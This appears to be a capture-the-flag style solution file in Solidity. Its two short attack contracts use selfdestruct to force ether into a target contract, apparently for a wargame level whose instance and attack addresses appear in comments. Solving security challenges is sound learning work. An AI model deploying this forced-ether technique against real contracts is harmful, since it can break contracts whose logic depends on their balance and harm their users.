// Instance Address: 0x33120Aee5Bb3edde0bD1Bb827a7EF8Ee642dBc6b

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack2 {

    function attack(address _force) public {
        address payable addressForce = address(uint160(address(_force)));
        selfdestruct(addressForce);
    }

    receive() external payable {}
}

// Attack Contract Address : 0x53Fb0b8db40D30Ee094aD2D9E330b60CAc0d285D

contract Attack {
    
    constructor(address payable target) payable {
        require(msg.value >0);
        selfdestruct(target);
    }
}